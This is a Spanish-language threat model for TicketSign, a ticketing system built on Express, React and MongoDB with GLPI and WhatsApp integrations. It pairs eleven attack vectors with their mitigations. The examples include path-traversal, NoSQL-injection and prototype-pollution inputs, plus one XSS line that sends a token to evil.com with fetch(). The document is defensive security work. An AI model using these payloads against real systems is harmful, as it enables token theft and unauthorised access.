# THREAT_MODEL.md — TicketSign

> Modelo de amenazas del proyecto. Última revisión: **2026-03-11** | Metodología: STRIDE + OWASP Threat Modeling

---

## 1. ALCANCE

Este documento cubre el sistema TicketSign completo:
- **Backend**: API REST Express.js en `ticketsign-server`
- **Frontend**: PWA React en `ticketsign-client`
- **Base de datos**: MongoDB en contenedor Docker
- **Integraciones externas**: GLPI API y Meta WhatsApp Cloud API
- **Infraestructura**: Docker Swarm + Traefik en servidor de producción

---

## 2. ACTORES DEL SISTEMA

### Actores Internos (Humanos)

| Actor | Nivel de Confianza | Descripción |
|---|---|---|
| `Super-Admin` | **Máximo** | Configura integraciones, gestiona todos los datos, accede a reportes |
| `Admin-Mesa` | **Alto** | Gestiona tickets y tareas, accede a reportes, no puede cambiar config del sistema |
| `Especialistas` | **Medio** | Crea/edita tareas propias, interactúa con GLPI, genera actas |
| `Compras` | **Medio** | Gestiona cotizaciones, aprueba/rechaza solicitudes de compra |
| `Administrativo` | **Bajo** | Visualiza tickets GLPI, agrega seguimientos |
| `Técnico Asignado` | **Bajo** | Solo puede cambiar estado de tareas asignadas |
| `Admin Emergencia` | **Máximo** | Acceso via `ADMIN_USER/ADMIN_PASSWORD` en `.env`; solo si GLPI no disponible |

### Actores Externos (Sistemas)

| Actor | Nivel de Confianza | Descripción |
|---|---|---|
| GLPI API | **Confiable con validación** | Fuente de autenticación y datos de tickets |
| Meta WhatsApp Cloud API | **Externo verificado** | Receptor de notificaciones (salida) |
| Traefik | **Infraestructura confiable** | Reverse proxy TLS, orquesta tráfico |
| Docker Swarm | **Infraestructura confiable** | Red aislada `jhamfstack` |

### Actores de Amenaza

| Actor | Motivación | Capacidad |
|---|---|---|
| Atacante web externo | Datos empresariales, acceso no autorizado | Media — acceso solo HTTP/S |
| Usuario interno malicioso | Escalar privilegios, ver datos de otros | Alta — tiene credenciales válidas |
| Competidor | Robo de información de clientes | Media |
| Bot automatizado | Brute force, scraping | Alta en volumen |
| Insider con acceso servidor | Robo de claves, datos | Crítica |

---

## 3. ACTIVOS CRÍTICOS

| Activo | Impacto si Comprometido | Protección Actual |
|---|---|---|
| `ENCRYPTION_KEY` | **Crítico** — Descifra todos los secretos en BD | Solo en `.env`, no en git |
| `JWT_SECRET` | **Crítico** — Permite forjar tokens de cualquier usuario | Solo en `.env`, no en git |
| `ADMIN_PASSWORD` | **Crítico** — Acceso Super-Admin sin GLPI | Solo en `.env`, no en git |
| Tokens GLPI (App + User) | **Alto** — Acceso completo a GLPI API | AES-256 en BD |
| Token WhatsApp | **Alto** — Envío de mensajes no autorizado + costos | AES-256 en BD |
| Base de datos MongoDB | **Alto** — Todos los datos operacionales | Red Docker privada |
| Actas de mantenimiento | **Medio** — Datos técnicos de equipos | Auth JWT + visibilidad por usuario |
| Cotizaciones | **Medio** — Datos financieros y de proveedores | Auth JWT + visibilidad estricta |
| Datos de técnicos (teléfonos) | **Medio** — Privacidad de empleados | Solo en GLPI, nunca almacenados en TicketSign |

---

## 4. DIAGRAMA DE FLUJO DE DATOS

```
[Browser/PWA] ──HTTPS──► [Traefik] ──HTTP──► [ticketsign-server:5000]
                                                        │
                                          ┌─────────────┼─────────────┐
                                          │             │             │
                                     [MongoDB]    [GLPI API]   [WhatsApp API]
                                          │         (HTTPS)       (HTTPS)
                                    (Red Docker
                                     aislada)

Flujos sensibles:
1. Credenciales → login → GLPI Basic Auth (HTTPS, efímero)
2. Tokens config → BD (AES-256 cifrado)
3. JWT → Cliente localStorage (8h TTL)
4. Archivos → uploads/ (autenticados, path-safe)
```

---

## 5. VECTORES DE ATAQUE Y MITIGACIONES

### Vector 1: Brute Force en Login
```
Atacante → POST /api/auth/login (múltiples intentos) → Acceso no autorizado
```
| Aspecto | Detalle |
|---|---|
| **Probabilidad** | Alta |
| **Impacto** | Alto |
| **Mitigación** | `loginLimiter`: 10 intentos / 15 min por IP |
| **Mitigación adicional** | Logging de IP + username en cada fallo |
| **Debilidad residual** | IPs rotativas (Tor, botnets) pueden evadirlo |
| **Contramedida adicional** | Considerar CAPTCHA o alertas por email en N intentos |

### Vector 2: JWT Forgery / Hijacking
```
Atacante → Obtiene JWT de localStorage (XSS) → Acceso a todos los endpoints
```
| Aspecto | Detalle |
|---|---|
| **Probabilidad** | Baja |
| **Impacto** | Crítico |
| **Mitigación** | CSP estricta (previene XSS), sanitizador HTML, HTTPS |
| **Mitigación adicional** | JWT expira en 8h, interceptor limpia en 401 |
| **Debilidad residual** | localStorage es accesible a JS de la misma origen |
| **Decisión arquitectónica** | Aceptado (D-02): PWA offline requiere tokens en JS |

### Vector 3: IDOR — Acceso a Recursos de Otros Usuarios
```
Atacante autenticado → GET /api/quotations/ID_de_otro_usuario → Datos privados
```
| Aspecto | Detalle |
|---|---|
| **Probabilidad** | Media |
| **Impacto** | Alto |
| **Mitigación** | Visibilidad estricta: query filtra por `createdBy`/`assigned_to` del usuario actual |
| **Mitigación adicional** | `validateObjectId()` antes de cualquier `findById()` |
| **Estado** | ✅ Implementado |

### Vector 4: NoSQL Injection
```
Atacante → GET /api/tasks?status[$ne]=CANCELADA → Query manipulada → Datos de todos
```
| Aspecto | Detalle |
|---|---|
| **Probabilidad** | Media |
| **Impacto** | Alto |
| **Mitigación** | `String(req.query.*)` convierte objetos a string `[object Object]` |
| **Mitigación adicional** | Mongoose schema valida tipos en escritura |
| **Estado** | ✅ Implementado |

### Vector 5: Path Traversal en Uploads / View
```
Atacante → GET /api/quotations/view/../../.env → Lectura de archivo del sistema
```
| Aspecto | Detalle |
|---|---|
| **Probabilidad** | Media |
| **Impacto** | Crítico |
| **Mitigación** | `path.basename()` elimina directorio del filename |
| **Mitigación adicional** | `normalizedPath.startsWith(normUploads + sep)` bloquea traversal |
| **Mitigación adicional** | `uploads/` NO servido estáticamente |
| **Estado** | ✅ Implementado |

### Vector 6: SSRF via URL de GLPI Configurable
```
Atacante (Admin) → Configura glpi_api_url = http://internal-service → Servidor hace request interno
```
| Aspecto | Detalle |
|---|---|
| **Probabilidad** | Baja |
| **Impacto** | Alto |
| **Mitigación** | En producción: valida `glpiUrl.startsWith('https://')` antes de llamar |
| **Debilidad residual** | No se validan IPs privadas (127.x, 192.168.x, 10.x) |
| **Recomendación** | Añadir validación de IP privada si el riesgo aumenta |

### Vector 7: Mass Assignment en Configuración
```
Atacante (Admin) → POST /api/config { "__proto__": {...} } → Prototype pollution
Atacante (Admin) → POST /api/config { "jwt_secret": "atacante" } → Override de secreto
```
| Aspecto | Detalle |
|---|---|
| **Probabilidad** | Baja |
| **Impacto** | Crítico |
| **Mitigación** | `ALLOWED_CONFIG_KEYS` whitelist en modelo Mongoose + validación en ruta |
| **Mitigación adicional** | `jwt_secret` y `encryption_key` NO están en `ALLOWED_CONFIG_KEYS` |
| **Estado** | ✅ Implementado |

### Vector 8: Timing Attack en Credenciales Maestro
```
Atacante → Mide tiempo de respuesta del login maestro → Deduce caracteres correctos
```
| Aspecto | Detalle |
|---|---|
| **Probabilidad** | Muy baja |
| **Impacto** | Crítico (daría acceso Super-Admin) |
| **Mitigación** | `crypto.timingSafeEqual()` para comparación de longitud constante |
| **Estado** | ✅ Implementado |

### Vector 9: Denial of Service — Payload Masivo
```
Atacante → POST /api/sync/maintenance con body de 50MB → Out of memory
```
| Aspecto | Detalle |
|---|---|
| **Probabilidad** | Media |
| **Impacto** | Alto |
| **Mitigación** | `express.json({ limit: '1mb' })` |
| **Mitigación adicional** | `multer limits: { fileSize: 20MB }`, `uploadLimiter: 100/h` |
| **Mitigación adicional** | `apiLimiter: 2000/15min` |
| **Estado** | ✅ Implementado |

### Vector 10: Escalación de Privilegios via Rol en Body
```
Atacante → POST /api/auth → envía perfil = 'Super-Admin' en body → Token forjado con admin
```
| Aspecto | Detalle |
|---|---|
| **Probabilidad** | Baja |
| **Impacto** | Crítico |
| **Mitigación** | El perfil siempre se toma de la respuesta de GLPI, nunca del `req.body` |
| **Mitigación adicional** | JWT firmado con `JWT_SECRET` que solo el servidor conoce |
| **Estado** | ✅ Implementado |

### Vector 11: XSS via Contenido HTML de GLPI
```
GLPI ticket con contenido: <script>fetch('https://evil.com?t='+localStorage.getItem('glpi_pro_token'))</script>
→ TicketDetail.jsx renderiza → Token exfiltrado
```
| Aspecto | Detalle |
|---|---|
| **Probabilidad** | Media |
| **Impacto** | Alto |
| **Mitigación** | `sanitizeHTML()` en `TicketDetail.jsx` con allowlist de tags + bloqueo de `on*`, `javascript:`, `data:`, `vbscript:` |
| **Mitigación adicional** | CSP `script-src: 'self'` limita ejecución de scripts externos |
| **Estado** | ✅ Implementado |

---

## 6. RIESGOS RESIDUALES ACEPTADOS

| ID | Riesgo | Razón para Aceptar | Compensación |
|---|---|---|---|
| R-01 | JWT en `localStorage` | PWA offline requiere JS access | CSP + sanitizador + HTTPS + 8h TTL |
| R-02 | Sin MFA | GLPI no soporta MFA nativo | Rate limit + logs de acceso |
| R-03 | Sin blacklist de JWTs | Overhead de estado en arquitectura stateless | Expiración corta (8h) |
| R-04 | MongoDB sin autenticación | Red Docker privada + sin puerto expuesto | Monitoreo de acceso |
| R-05 | `unsafe-inline` en CSP | Requerido por Tailwind CSS en dev | Sanitizador DOM activo |
| R-06 | SSRF sin validación de IPs privadas | Riesgo bajo en arquitectura actual | Solo admin puede configurar URL GLPI |
| R-07 | Deps transitivas vite (HIGH) | Afectan solo entorno de build | CI/CD controlado, no runtime |

---

## 7. CONTROLES DE SEGURIDAD IMPLEMENTADOS (RESUMEN)

| Control | Tipo | Estado |
|---|---|---|
| Rate limiting en login (10/15min) | Preventivo | ✅ |
| Rate limiting general API (2000/15min) | Preventivo | ✅ |
| Rate limiting en uploads (100/h) | Preventivo | ✅ |
| JWT con expiración 8h | Preventivo | ✅ |
| `crypto.timingSafeEqual` en credenciales maestro | Preventivo | ✅ |
| AES-256-CBC para secretos en BD | Preventivo | ✅ |
| HTTPS via Traefik + Let's Encrypt | Preventivo | ✅ |
| HSTS en producción | Preventivo | ✅ |
| CSP sin `unsafe-eval` | Preventivo | ✅ |
| CORS whitelist | Preventivo | ✅ |
| Helmet (X-Frame, X-Content-Type, etc.) | Preventivo | ✅ |
| `validateObjectId()` antes de queries | Preventivo | ✅ |
| `String()` cast en `req.query` | Preventivo | ✅ |
| ALLOWED_CONFIG_KEYS whitelist | Preventivo | ✅ |
| `path.basename()` + boundary check | Preventivo | ✅ |
| Sanitizador HTML en TicketDetail | Preventivo | ✅ |
| Visibilidad estricta por usuario | Preventivo | ✅ |
| Logging de fallos de autenticación con IP | Detectivo | ✅ |
| Errores genéricos al cliente | Detectivo | ✅ |
| `authorizeRoles()` por rol | Preventivo | ✅ |
| Rol de usuario desde GLPI (no body) | Preventivo | ✅ |

---

## 8. HISTORIAL DE CAMBIOS

| Versión | Fecha | Cambios |
|---|---|---|
| v1.0 | 2026-03-09 | Auditoría inicial; detección de SEC-01 a SEC-05 |
| v1.1 | 2026-03-10 | Añadidas mitigaciones CORS, rate limit, uploads protegidos |
| v2.0 | 2026-03-11 | Auditoría avanzada: HSTS, timingSafeEqual, ALLOWED_CONFIG_KEYS, uploadLimiter, eliminación GLPI del docker-compose |
